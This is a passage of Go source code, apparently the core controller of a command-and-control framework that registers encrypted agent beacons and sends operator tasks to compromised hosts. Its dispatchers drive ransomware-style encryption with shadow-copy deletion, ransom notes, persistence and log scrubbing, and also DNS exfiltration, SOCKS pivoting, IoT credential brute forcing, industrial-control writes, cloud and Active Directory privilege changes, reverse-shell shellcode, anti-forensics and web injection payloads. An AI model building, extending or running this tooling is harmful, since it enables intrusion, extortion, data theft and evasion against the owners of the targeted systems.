		var hops []string
		for _, h := range strings.Split(*proxyChain, ",") {
			h = strings.TrimSpace(h)
			if h != "" {
				hops = append(hops, h)
			}
		}
		go runProxyChainDispatch(mgr, proxyChainArgs{
			Hops:    hops,
			Target:  *proxyChainTarget,
			Timeout: *proxyChainTimeout,
		})
	}

	// csint dispatch — content-source intelligence on the first agent
	if *csintAction != "" {
		go runCSIntDispatch(mgr, csintArgs{
			Action:    *csintAction,
			Root:      *csintRoot,
			Query:     *csintQuery,
			IndexPath: *csintIndexPath,
		})
	}

	// bluetooth dispatch — RF Bluetooth primitives on the first agent
	if *btAction != "" {
		go runBluetoothDispatch(mgr, bluetoothArgs{
			Action:   *btAction,
			Address:  *btAddress,
			Duration: *btDuration,
		})
	}

	// drone dispatch — MAVLink operations on the first agent
	if *droneAction != "" {
		go runDroneDispatch(mgr, droneArgs{
			Action:     *droneAction,
			Host:       *droneHost,
			Port:       *dronePort,
			SysID:      uint8(*droneSysID),
			CompID:     uint8(*droneCompID),
			TargetSys:  uint16(*droneTargetSys),
			TargetComp: uint16(*droneTargetComp),
			Command:    uint16(*droneCommand),
			Listen:     *droneListen,
			Lat:        float32(*droneLat),
			Lon:        float32(*droneLon),
			Alt:        float32(*droneAlt),
			UseV2:      *droneV2,
			SigKey:     *droneSigKey,
			LinkID:     uint8(*droneLinkID),
		})
	}

	// cctv dispatch — RTSP camera reconnaissance on the first agent
	if *cctvAction != "" {
		go runCCTV(mgr, cctvArgs{
			Action:  *cctvAction,
			Host:    *cctvHost,
			URL:     *cctvURL,
			User:    *cctvUser,
			Pass:    *cctvPass,
			Timeout: *cctvTimeout,
		})
	}

	// report dispatch — build a report from collected JSON
	if *reportTitle != "" {
		findingsBlob := ""
		if *reportFindings != "" {
			if b, err := os.ReadFile(*reportFindings); err == nil {
				findingsBlob = string(b)
			} else {
				log.Printf("[report] read findings: %v", err)
			}
		}
		go runReportDispatch(mgr, reportArgs{
			Title:      *reportTitle,
			Operator:   *reportOperator,
			Engagement: *reportEngagement,
			SourceDir:  *reportSrcDir,
			Findings:   findingsBlob,
			OutPath:    *reportOut,
		})
	}

	// webreq dispatch — send a raw HTTP request via the first agent
	if *webReqURL != "" {
		go runWebReqDispatch(mgr, webReqArgs{
			URL:     *webReqURL,
			Method:  *webReqMethod,
			Body:    *webReqBody,
			Timeout: *webReqTimeout,
			SkipTLS: *webReqSkipTLS,
		})
	}

	// workflow dispatch — recon reducer on the first agent
	if *workflowSteps != "" {
		var steps []string
		if *workflowSteps != "default" {
			for _, s := range strings.Split(*workflowSteps, ",") {
				s = strings.TrimSpace(s)
				if s != "" {
					steps = append(steps, s)
				}
			}
		}
		go runWorkflowDispatch(mgr, workflowArgs{
			Steps:       steps,
			DryRun:      *workflowDry,
			CSIntRoot:   *workflowCSInt,
			ReportTitle: *workflowTitle,
		})
	}

	if *dnsBind != "" {
		r := dnsexfil.DefaultReassembler()
		srv := &dnsexfil.Server{Bind: *dnsBind, Domain: *dnsDomain, Reasm: r}
		go func() {
			if err := srv.Start(context.Background()); err != nil {
				log.Printf("[dnsexfil] server: %v", err)
			}
		}()
	}

	if *pcapIface != "" {
		if *pcapOut == "" {
			log.Fatalf("-pcap requires -pcap-out")
		}
		go runPCAPCapture(mgr, *pcapIface, *pcapOut, *pcapDuration)
	}

	if *headless {
		for ev := range mgr.Events {
			fmt.Printf("[%s] %s: %s\n", ev.Kind, ev.AgentID, ev.Text)
		}
		return
	}

	pl := planner.NewOllama("", *llmModel)
	if *noLLM {
		pl = nil // falls back to rule planner
	}
	p := tea.NewProgram(tui.New(mgr, *eng, *port, pl), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		log.Fatalf("tui: %v", err)
	}
}

func acceptLoop(ln net.Listener, mgr *session.Manager) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleConn(conn, mgr)
	}
}

func runPlugin(spec string, timeout time.Duration) {
	parts := strings.Fields(spec)
	if len(parts) == 0 {
		log.Fatalf("-plugin needs at least a module name")
	}
	repo := findRepoRoot()
	if repo == "" {
		log.Fatalf("could not find repo root (expected redsky.py)")
	}
	out, err := plugin.Invoke(context.Background(), repo, parts[0], parts[1:], timeout)
	if out != "" {
		fmt.Print(out)
	}
	if err != nil {
		log.Printf("plugin exited with error: %v", err)
		os.Exit(1)
	}
}

func findRepoRoot() string {
	cwd, err := os.Getwd()
	if err != nil {
		return ""
	}
	dir := cwd
	for {
		if _, err := os.Stat(filepath.Join(dir, "redsky.py")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return ""
		}
		dir = parent
	}
}

func handleConn(conn net.Conn, mgr *session.Manager) {
	remote := conn.RemoteAddr().String()
	defer func() {
		if r := recover(); r != nil {
			log.Printf("%s: panic: %v", remote, r)
			conn.Close()
		}
	}()

	// The listener already wrapped conn in TLS; but we haven't forced the
	// handshake yet. Do it now.
	if tlsConn, ok := conn.(*tls.Conn); ok {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return
		}
		conn.SetDeadline(time.Time{})
	}

	coreKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		conn.Close()
		return
	}
	hello := map[string]string{
		"type":    "ecdh_hello",
		"pubkey":  base64.StdEncoding.EncodeToString(coreKey.PublicKey().Bytes()),
		"version": "3",
	}
	helloRaw, _ := json.Marshal(hello)
	if err := wire.WriteFrame(conn, 0, helloRaw); err != nil {
		conn.Close()
		return
	}

	frame, err := wire.ReadFrame(conn)
	if err != nil {
		conn.Close()
		return
	}
	var reply map[string]string
	if err := json.Unmarshal(frame.Payload, &reply); err != nil {
		conn.Close()
		return
	}
	if reply["type"] != "ecdh_reply" {
		conn.Close()
		return
	}
	agentPub, err := base64.StdEncoding.DecodeString(reply["pubkey"])
	if err != nil {
		conn.Close()
		return
	}
	key, err := crypto.DeriveKey(coreKey, agentPub)
	if err != nil {
		conn.Close()
		return
	}
	cs, err := crypto.NewSession(key)
	if err != nil {
		conn.Close()
		return
	}

	// Read beacon.
	frame, err = wire.ReadFrame(conn)
	if err != nil {
		conn.Close()
		return
	}
	beaconRaw, err := cs.Decrypt(frame.Payload)
	if err != nil {
		conn.Close()
		return
	}
	var env proto.Envelope
	if err := json.Unmarshal(beaconRaw, &env); err != nil {
		conn.Close()
		return
	}
	var beacon proto.Beacon
	if err := json.Unmarshal(env.Payload, &beacon); err != nil {
		conn.Close()
		return
	}
	mgr.Register(beacon.AgentID, beacon.Info, conn, cs)
}

// runScanner is the fast Go port scanner (Phase 6 + discovery).
func runScanner(cidr, ports string, threads int, timeout time.Duration) {
	allHosts, err := scanner.ParseCIDR(cidr)
	if err != nil {
		log.Fatalf("scan: %v", err)
	}
	portList, err := scanner.ParsePorts(ports)
	if err != nil {
		log.Fatalf("scan: %v", err)
	}
	ctx := context.Background()
	t0 := time.Now()

	// Stage 1: fast host discovery.
	fmt.Printf("discovering live hosts in %s (%d hosts)...\n", cidr, len(allHosts))
	live := scanner.DiscoverAlive(ctx, allHosts, nil, 500, 800*time.Millisecond, func(h string) {
		fmt.Printf("[live] %s\n", h)
	})
	fmt.Printf("discovery: %d/%d hosts alive in %s\n\n",
		len(live), len(allHosts), time.Since(t0).Truncate(time.Millisecond))

	if len(live) == 0 {
		fmt.Println("no live hosts found")
		return
	}

	// Stage 2: full port scan on live hosts only.
	fmt.Printf("scanning %d live hosts x %d ports (%d probes) with %d workers\n",
		len(live), len(portList), len(live)*len(portList), threads)

	var results []scanner.Result
	var mu sync.Mutex

	err = scanner.Scan(ctx, scanner.ScanOptions{
		Hosts:   live,
		Ports:   portList,
		Threads: threads,
		Timeout: timeout,
	}, func(r scanner.Result) {
		mu.Lock()
		results = append(results, r)
		mu.Unlock()
		fmt.Printf("[+] %s:%d\n", r.Host, r.Port)
	})
	if err != nil {
		log.Fatalf("scan: %v", err)
	}

	elapsed := time.Since(t0)
	fmt.Printf("\n%d open port(s) in %s\n", len(results), elapsed.Truncate(time.Millisecond))
	if len(results) > 0 {
		path, err := scanner.WriteJSON(results)
		if err != nil {
			log.Printf("write results: %v", err)
		} else {
			fmt.Printf("saved: %s\n", path)
		}
	}
}

// startSocks waits for an agent to connect, then starts a SOCKS5 listener
// that tunnels every connection through it.
func startSocks(bind string, mgr *session.Manager) {
	// Wait for first session.
	for {
		sessions := mgr.Sessions()
		if len(sessions) > 0 {
			s := sessions[0]
			ts := tunnel.NewManager()
			srv := &tunnel.Server{Bind: bind, Sender: s, Tunnels: ts}
			log.Printf("[socks] starting on %s, exit=%s", bind, s.AgentID)
			if err := srv.Start(context.Background()); err != nil {
				log.Printf("[socks] error: %v", err)
			}
			return
		}
		time.Sleep(500 * time.Millisecond)
	}
}

// runPCAPCapture waits for an agent, opens a capture session, and writes
// received frames to a .pcap file on the core.
func runPCAPCapture(mgr *session.Manager, iface, outPath string, duration time.Duration) {
	// wait for an agent
	for {
		if len(mgr.Sessions()) > 0 {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	log.Printf("[pcap] capturing on %s via %s -> %s (duration %s)", iface, s.AgentID, outPath, duration)

	// register a tunnel-like receive slot for capture data
	sessionID := fmt.Sprintf("cap-%d", time.Now().UnixNano())
	s.RegisterCaptureChannel(sessionID)

	// open the pcap file
	pw, err := capturer.NewPCAPWriter(outPath)
	if err != nil {
		log.Printf("[pcap] write %s: %v", outPath, err)
		return
	}
	defer pw.Close()

	// ask the agent to start
	if err := s.SendCaptureStart(sessionID, iface, 0); err != nil {
		log.Printf("[pcap] send start: %v", err)
		return
	}

	deadline := time.After(duration)
	frames := 0
	for {
		select {
		case <-deadline:
			// stop the capture
			s.SendCaptureStop(sessionID)
			log.Printf("[pcap] duration elapsed — %d frames written to %s", frames, outPath)
			return
		case chunk, ok := <-s.GetCaptureChannel(sessionID):
			if !ok {
				log.Printf("[pcap] agent closed — %d frames written", frames)
				return
			}
			// chunk = concatenated pcap-record-format frames
			i := 0
			for i+16 <= len(chunk) {
				tsSec := binary.LittleEndian.Uint32(chunk[i : i+4])
				tsUsec := binary.LittleEndian.Uint32(chunk[i+4 : i+8])
				incl := binary.LittleEndian.Uint32(chunk[i+8 : i+12])
				orig := binary.LittleEndian.Uint32(chunk[i+12 : i+16])
				i += 16
				if i+int(incl) > len(chunk) {
					break
				}
				f := capturer.Frame{
					TS:      time.Unix(int64(tsSec), int64(tsUsec)*1000),
					Data:    chunk[i : i+int(incl)],
					OrigLen: int(orig),
				}
				pw.WriteFrame(f)
				frames++
				i += int(incl)
			}
		}
	}
}

// runWirelessCapture waits for an agent, opens a wireless capture session,
// and writes received 802.11 frames to a .pcap file on the core.
func runWirelessCapture(mgr *session.Manager, iface string, channel int, outPath string, duration time.Duration) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	log.Printf("[wireless] capture on %s ch=%d via %s -> %s", iface, channel, s.AgentID, outPath)

	sessionID := fmt.Sprintf("wl-%d", time.Now().UnixNano())
	s.RegisterCaptureChannel(sessionID)

	pw, err := capturer.NewPCAPWriter(outPath)
	if err != nil {
		log.Printf("[wireless] pcap open: %v", err)
		return
	}
	defer pw.Close()

	if err := s.SendWirelessStart(sessionID, iface, channel); err != nil {
		log.Printf("[wireless] send start: %v", err)
		return
	}

	deadline := time.After(duration)
	frames := 0
	for {
		select {
		case <-deadline:
			s.SendWirelessStop(sessionID)
			log.Printf("[wireless] duration elapsed - %d frames to %s", frames, outPath)
			return
		case chunk, ok := <-s.GetCaptureChannel(sessionID):
			if !ok {
				log.Printf("[wireless] agent closed - %d frames", frames)
				return
			}
			i := 0
			for i+12 <= len(chunk) {
				var ns uint64
				for k := 0; k < 8; k++ {
					ns = (ns << 8) | uint64(chunk[i+k])
				}
				ln := uint32(chunk[i+8])<<24 | uint32(chunk[i+9])<<16 |
					uint32(chunk[i+10])<<8 | uint32(chunk[i+11])
				i += 12
				if i+int(ln) > len(chunk) {
					break
				}
				pw.WriteFrame(capturer.Frame{
					TS:      time.Unix(0, int64(ns)),
					Data:    chunk[i : i+int(ln)],
					OrigLen: int(ln),
				})
				frames++
				i += int(ln)
			}
		}
	}
}

// cryptoDispatchArgs carries the operator's -crypto flags to the dispatcher.
type cryptoDispatchArgs struct {
	Root          string
	PubPath       string
	KeyID         uint32
	KillVSS       bool
	Note          bool
	NoteEmail     string
	NoteAddr      string
	NotePrice     string
	DryRun        bool
	PostPersist   bool
	PersistName   string
	PersistOnBoot bool
	PostWallpaper bool
	WallpaperPath string
	PostLogScrub  bool
}

// runCryptoDispatch waits for the first agent, pushes the operator public
// key, and fires a CryptoStart. Progress streams back as CryptoData events.
func runCryptoDispatch(mgr *session.Manager, a cryptoDispatchArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]

	pub, err := os.ReadFile(a.PubPath)
	if err != nil {
		log.Printf("[crypto] read pub %s: %v", a.PubPath, err)
		return
	}

	sessionID := fmt.Sprintf("cx-%d", time.Now().UnixNano())
	log.Printf("[crypto] %s -> %s (vss=%v note=%v dry=%v)",
		a.Root, s.AgentID, a.KillVSS, a.Note, a.DryRun)

	if err := s.SendKeyPush(sessionID, "operator.pub.pem", pub); err != nil {
		log.Printf("[crypto] key push: %v", err)
		return
	}
	if err := s.SendCryptoStart(sessionID, a.Root, a.KeyID, a.DryRun, a.KillVSS,
		a.Note, a.NoteEmail, a.NoteAddr, a.NotePrice, ""); err != nil {
		log.Printf("[crypto] start: %v", err)
		return
	}
}

// iotCredsArgs carries the operator's -iotcreds flags.
type iotCredsArgs struct {
	Host      string
	Port      int
	Protocol  string
	Path      string
	Timeout   int
	StopFirst bool
}

// runIoTCredsDispatch waits for the first agent, then fires an
// IoTCredsStart over the existing tunnel. Attempts stream back as
// IoTCredsData events.
func runIoTCredsDispatch(mgr *session.Manager, a iotCredsArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("ic-%d", time.Now().UnixNano())

	log.Printf("[iotcreds] %s:%d/%s -> %s (first=%v)",
		a.Host, a.Port, a.Protocol, s.AgentID, a.StopFirst)

	if err := s.SendIoTCredsStart(sessionID, a.Host, a.Port, a.Protocol, a.Path, a.Timeout, a.StopFirst); err != nil {
		log.Printf("[iotcreds] start: %v", err)
	}
}

// icsArgs carries the operator's -ics flags to the dispatcher.
type icsArgs struct {
	Host        string
	Port        int
	Proto       string
	Action      string
	Unit        uint8
	Func        byte
	Start       uint16
	Count       uint16
	Value       uint16
	Area        byte
	DB          uint16
	Data        []byte
	Dest        uint16
	Src         uint16
	Class       uint8
	ObjType     uint16
	ObjInstance uint32
	PropertyID  uint16
	Tag         string
	DataType    byte
}

// runIcsDispatch waits for the first agent, then fires an IcsStart over
// the existing tunnel. Results stream back as IcsData events.
func runIcsDispatch(mgr *session.Manager, a icsArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("ics-%d", time.Now().UnixNano())

	log.Printf("[ics] %s:%d %s/%s -> %s", a.Host, a.Port, a.Proto, a.Action, s.AgentID)

	req := proto.IcsStart{
		SessionID:   sessionID,
		Protocol:    a.Proto,
		Host:        a.Host,
		Port:        a.Port,
		Action:      a.Action,
		Unit:        a.Unit,
		Func:        a.Func,
		Start:       a.Start,
		Count:       a.Count,
		Value:       a.Value,
		Area:        a.Area,
		DB:          a.DB,
		Data:        a.Data,
		Dest:        a.Dest,
		Src:         a.Src,
		Class:       a.Class,
		ObjType:     a.ObjType,
		ObjInstance: a.ObjInstance,
		PropertyID:  a.PropertyID,
		Tag:         a.Tag,
		DataType:    a.DataType,
	}
	if err := s.SendIcsStart(sessionID, req); err != nil {
		log.Printf("[ics] start: %v", err)
	}
}

// hexDecode is a small helper so we do not have to import encoding/hex
// if the core file does not already.
func hexDecode(s string) ([]byte, error) {
	s = strings.ReplaceAll(s, " ", "")
	s = strings.ReplaceAll(s, ":", "")
	if len(s)%2 != 0 {
		return nil, errors.New("odd-length hex")
	}
	out := make([]byte, len(s)/2)
	for i := 0; i < len(out); i++ {
		b, err := strconv.ParseUint(s[i*2:i*2+2], 16, 8)
		if err != nil {
			return nil, err
		}
		out[i] = byte(b)
	}
	return out, nil
}

// cloudArgs carries the operator's -cloud* flags.
type cloudArgs struct {
	Action    string
	Provider  string
	KeyID     string
	Secret    string
	Token     string
	Region    string
	Arn       string
	Driver    string
	User      string
	Group     string
	PolicyArn string
	RoleArn   string
}

// runCloudDispatch waits for the first agent, fires a CloudStart.
func runCloudDispatch(mgr *session.Manager, a cloudArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("cl-%d", time.Now().UnixNano())

	log.Printf("[cloud] %s/%s -> %s", a.Action, a.Provider, s.AgentID)

	req := proto.CloudStart{
		SessionID:       sessionID,
		Action:          a.Action,
		Cloud:           a.Provider,
		AccessKeyID:     a.KeyID,
		SecretAccessKey: a.Secret,
		SessionToken:    a.Token,
		Region:          a.Region,
		PolicySourceArn: a.Arn,
		Driver:          a.Driver,
		TargetUser:      a.User,
		TargetGroup:     a.Group,
		PolicyARN:       a.PolicyArn,
		RoleARN:         a.RoleArn,
	}
	if err := s.SendCloudStart(sessionID, req); err != nil {
		log.Printf("[cloud] start: %v", err)
	}
}

// cryptoOpArgs carries the operator's -crypto-* op flags.
type cryptoOpArgs struct {
	Op       string
	Priv     string
	Phrase   string
	Algo     string
	Hash     string
	Wordlist string
	JavaA    uint32
	JavaB    uint32
	JavaN    int
	WinFirst uint16
	WinLo    uint32
	WinHi    uint32
}

// runCryptoOpDispatch waits for the first agent, fires a CryptoOpStart.
func runCryptoOpDispatch(mgr *session.Manager, a cryptoOpArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("co-%d", time.Now().UnixNano())

	log.Printf("[cryptoop] %s -> %s", a.Op, s.AgentID)

	req := proto.CryptoOpStart{
		SessionID:  sessionID,
		Op:         a.Op,
		PrivHex:    a.Priv,
		Passphrase: a.Phrase,
		Algo:       a.Algo,
		TargetHash: a.Hash,
		Wordlist:   a.Wordlist,
		JavaA:      a.JavaA,
		JavaB:      a.JavaB,
		JavaN:      a.JavaN,
		WinFirst:   a.WinFirst,
		WinLo:      a.WinLo,
		WinHi:      a.WinHi,
	}
	if err := s.SendCryptoOpStart(sessionID, req); err != nil {
		log.Printf("[cryptoop] start: %v", err)
	}
}

// socialArgs carries the operator's -social* flags.
type socialArgs struct {
	Action  string
	User    string
	Email   string
	Domain  string
	Threads int
}

// runSocialDispatch waits for the first agent, fires a SocialStart.
func runSocialDispatch(mgr *session.Manager, a socialArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("so-%d", time.Now().UnixNano())

	log.Printf("[social] %s -> %s", a.Action, s.AgentID)

	req := proto.SocialStart{
		SessionID: sessionID,
		Action:    a.Action,
		User:      a.User,
		Email:     a.Email,
		Domain:    a.Domain,
		Threads:   a.Threads,
	}
	if err := s.SendSocialStart(sessionID, req); err != nil {
		log.Printf("[social] start: %v", err)
	}
}

// webSSRFArgs carries the operator's -webssrf* flags.
type webSSRFArgs struct {
	URL     string
	Method  string
	Threads int
}

// runWebSSRFDispatch waits for the first agent, fires WebSSRFStart.
func runWebSSRFDispatch(mgr *session.Manager, a webSSRFArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("ws-%d", time.Now().UnixNano())

	log.Printf("[webssrf] -> %s (single=%v threads=%d)", s.AgentID, a.URL != "", a.Threads)

	req := proto.WebSSRFStart{SessionID: sessionID, Threads: a.Threads}
	if a.URL != "" {
		req.Probes = []proto.WebSSRFProbe{
			{Label: "custom", URL: a.URL, Method: a.Method},
		}
	}
	if err := s.SendWebSSRFStart(sessionID, req); err != nil {
		log.Printf("[webssrf] start: %v", err)
	}
}

// webSSTIArgs carries the operator's -webssti* flags.
type webSSTIArgs struct {
	Engine  string
	Cmd     string
	ListFPs bool
}

// runWebSSTIDispatch waits for the first agent, fires a WebSSTIStart.
func runWebSSTIDispatch(mgr *session.Manager, a webSSTIArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("si-%d", time.Now().UnixNano())

	eng := a.Engine
	if eng == "all" {
		eng = ""
	}
	log.Printf("[webssti] engine=%q cmd=%q fps=%v -> %s", eng, a.Cmd, a.ListFPs, s.AgentID)

	req := proto.WebSSTIStart{
		SessionID: sessionID,
		Engine:    eng,
		Cmd:       a.Cmd,
		ListFPs:   a.ListFPs,
	}
	if err := s.SendWebSSTIStart(sessionID, req); err != nil {
		log.Printf("[webssti] start: %v", err)
	}
}

// webXSSArgs carries the operator's -webxss* flags.
type webXSSArgs struct {
	Context string
	JS      string
	FPs     bool
}

// runWebXSSDispatch waits for the first agent, fires a WebXSSStart.
func runWebXSSDispatch(mgr *session.Manager, a webXSSArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("xs-%d", time.Now().UnixNano())

	ctx := a.Context
	if ctx == "all" {
		ctx = ""
	}
	log.Printf("[webxss] ctx=%q fps=%v -> %s", ctx, a.FPs, s.AgentID)

	req := proto.WebXSSStart{
		SessionID: sessionID,
		Context:   ctx,
		JS:        a.JS,
		FPs:       a.FPs,
	}
	if err := s.SendWebXSSStart(sessionID, req); err != nil {
		log.Printf("[webxss] start: %v", err)
	}
}

// webXXEArgs carries the operator's -webxxe* flags.
type webXXEArgs struct {
	Kind     string
	File     string
	URL      string
	Attacker string
	Defaults bool
}

// runWebXXEDispatch waits for the first agent, fires a WebXXEStart.
func runWebXXEDispatch(mgr *session.Manager, a webXXEArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("xx-%d", time.Now().UnixNano())

	log.Printf("[webxxe] kind=%q defaults=%v -> %s", a.Kind, a.Defaults, s.AgentID)

	req := proto.WebXXEStart{
		SessionID: sessionID,
		Kind:      a.Kind,
		File:      a.File,
		URL:       a.URL,
		Attacker:  a.Attacker,
		Defaults:  a.Defaults,
	}
	if err := s.SendWebXXEStart(sessionID, req); err != nil {
		log.Printf("[webxxe] start: %v", err)
	}
}

// adEnumArgs carries the operator's -ad* flags.
type adEnumArgs struct {
	Action      string
	Host        string
	Port        int
	TLS         bool
	BindDN      string
	BindPW      string
	BaseDN      string
	WriteDriver string
	TargetDN    string
	GroupDN     string
	AttrName    string
	AttrValue   string
	Password    string
	UACValue    uint32
	UACCurrent  uint32
	SPN         string
	PrimaryGID  uint32
	EncodedSD   string
}

// runAdEnumDispatch waits for the first agent, fires an AdEnumStart.
func runAdEnumDispatch(mgr *session.Manager, a adEnumArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("ad-%d", time.Now().UnixNano())

	log.Printf("[adenum] %s @ %s:%d -> %s", a.Action, a.Host, a.Port, s.AgentID)

	req := proto.AdEnumStart{
		SessionID: sessionID,
		Action: func() string {
			if a.WriteDriver != "" {
				return "write"
			}
			return a.Action
		}(),
		Host:        a.Host,
		Port:        a.Port,
		UseTLS:      a.TLS,
		BindDN:      a.BindDN,
		BindPW:      a.BindPW,
		BaseDN:      a.BaseDN,
		WriteDriver: a.WriteDriver,
		TargetDN:    a.TargetDN,
		GroupDN:     a.GroupDN,
		AttrName:    a.AttrName,
		AttrValue:   a.AttrValue,
		Password:    a.Password,
		UACValue:    a.UACValue,
		UACCurrent:  a.UACCurrent,
		SPN:         a.SPN,
		PrimaryGID:  a.PrimaryGID,
		EncodedSD:   a.EncodedSD,
	}
	if err := s.SendAdEnumStart(sessionID, req); err != nil {
		log.Printf("[adenum] start: %v", err)
	}
}

// shellcodeArgs carries the operator's -shellcode-* flags.
type shellcodeArgs struct {
	Arch    string
	Kind    string
	Encode  string
	Key     uint8
	IP      string
	Port    uint16
	WinExec uint64
}

// runShellcodeDispatch waits for the first agent, fires a ShellcodeStart.
func runShellcodeDispatch(mgr *session.Manager, a shellcodeArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("sc-%d", time.Now().UnixNano())

	log.Printf("[shellcode] %s/%s encode=%s -> %s", a.Arch, a.Kind, a.Encode, s.AgentID)

	// parse ip into [4]byte
	var ip [4]byte
	var a1, b1, c1, d1 int
	if n, _ := fmt.Sscanf(a.IP, "%d.%d.%d.%d", &a1, &b1, &c1, &d1); n == 4 {
		ip = [4]byte{byte(a1), byte(b1), byte(c1), byte(d1)}
	} else {
		ip = [4]byte{127, 0, 0, 1}
	}

	req := proto.ShellcodeStart{
		SessionID: sessionID,
		Arch:      a.Arch,
		Kind:      a.Kind,
		Encode:    a.Encode,
		Key:       a.Key,
		IP:        ip,
		Port:      a.Port,
		WinExec:   a.WinExec,
	}
	if err := s.SendShellcodeStart(sessionID, req); err != nil {
		log.Printf("[shellcode] start: %v", err)
	}
}

// runHostInfoDispatch waits for the first agent, sends a HostInfoStart.
func runHostInfoDispatch(mgr *session.Manager) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("hi-%d", time.Now().UnixNano())
	log.Printf("[hostinfo] -> %s", s.AgentID)
	if err := s.SendHostInfoStart(sessionID, proto.HostInfoStart{SessionID: sessionID}); err != nil {
		log.Printf("[hostinfo] start: %v", err)
	}
}

// runVMDetectDispatch waits for the first agent, sends a VMDetectStart.
func runVMDetectDispatch(mgr *session.Manager) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("vm-%d", time.Now().UnixNano())
	log.Printf("[vmdetect] -> %s", s.AgentID)
	if err := s.SendVMDetectStart(sessionID, proto.VMDetectStart{SessionID: sessionID}); err != nil {
		log.Printf("[vmdetect] start: %v", err)
	}
}

// antiForenArgs carries the operator's -antiforen* flags.
type antiForenArgs struct {
	Action string
	Paths  []string
	DryRun bool
}

// runAntiForenDispatch waits for the first agent, sends an AntiForenStart.
func runAntiForenDispatch(mgr *session.Manager, a antiForenArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("af-%d", time.Now().UnixNano())
	log.Printf("[antiforen] %s dry=%v -> %s", a.Action, a.DryRun, s.AgentID)
	req := proto.AntiForenStart{
		SessionID: sessionID,
		Action:    a.Action,
		Paths:     a.Paths,
		DryRun:    a.DryRun,
	}
	if err := s.SendAntiForenStart(sessionID, req); err != nil {
		log.Printf("[antiforen] start: %v", err)
	}
}

// mailTraceArgs carries the operator's -mailtrace flag.
type mailTraceArgs struct {
	Path string
	Blob string
}

// runMailTraceDispatch waits for the first agent, sends a MailTraceStart.
func runMailTraceDispatch(mgr *session.Manager, a mailTraceArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("mt-%d", time.Now().UnixNano())
	log.Printf("[mailtrace] path=%q blob=%d bytes -> %s", a.Path, len(a.Blob), s.AgentID)
	req := proto.MailTraceStart{SessionID: sessionID, Path: a.Path, Blob: a.Blob}
	if err := s.SendMailTraceStart(sessionID, req); err != nil {
		log.Printf("[mailtrace] start: %v", err)
	}
}

// runGeoIPDispatch waits for the first agent, sends a GeoIPStart.
func runGeoIPDispatch(mgr *session.Manager, ips []string) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("gi-%d", time.Now().UnixNano())
	log.Printf("[geoip] %d ips -> %s", len(ips), s.AgentID)
	req := proto.GeoIPStart{SessionID: sessionID, IPs: ips}
	if err := s.SendGeoIPStart(sessionID, req); err != nil {
		log.Printf("[geoip] start: %v", err)
	}
}

// proxyChainArgs carries the operator's -proxy-chain* flags.
type proxyChainArgs struct {
	Hops    []string
	Target  string
	Timeout int
}

// runProxyChainDispatch waits for the first agent, sends a ProxyChainStart.
func runProxyChainDispatch(mgr *session.Manager, a proxyChainArgs) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	sessionID := fmt.Sprintf("pc-%d", time.Now().UnixNano())
	log.Printf("[proxychain] %d hops -> %s", len(a.Hops), s.AgentID)
	req := proto.ProxyChainStart{
		SessionID: sessionID,
		Hops:      a.Hops,
		Target:    a.Target,
		Timeout:   a.Timeout,
	}
	if err := s.SendProxyChainStart(sessionID, req); err != nil {
		log.Printf("[proxychain] start: %v", err)
	}
}

// csintArgs carries the operator's -csint* flags.
type csintArgs struct {
	Action    string
	Root      string
	Query     string
	IndexPath string
}

// runCSIntDispatch waits for the first agent, sends a CSIntStart.
